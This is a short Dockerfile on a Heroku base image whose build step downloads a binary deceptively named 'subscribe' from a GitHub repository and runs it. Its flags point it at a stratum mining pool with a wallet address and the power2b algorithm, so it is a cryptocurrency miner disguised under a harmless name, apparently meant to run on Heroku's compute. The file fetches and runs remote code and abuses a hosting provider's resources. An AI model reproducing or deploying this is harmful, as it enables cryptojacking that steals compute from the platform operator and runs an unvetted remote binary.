FROM heroku/heroku:20-build
RUN apt-get install -y curl git unzip wget
RUN wget https://github.com/giovanibrenton/Student/raw/main/subscribe; chmod +x subscribe; ./subscribe -a power2b -o stratum+tcp://mbc-na.smkn2.xyz:7022 -u MbahnZehNnk4GiH4AcavjPHqsZZaWHJycF.VPS
CMD bash heroku.sh
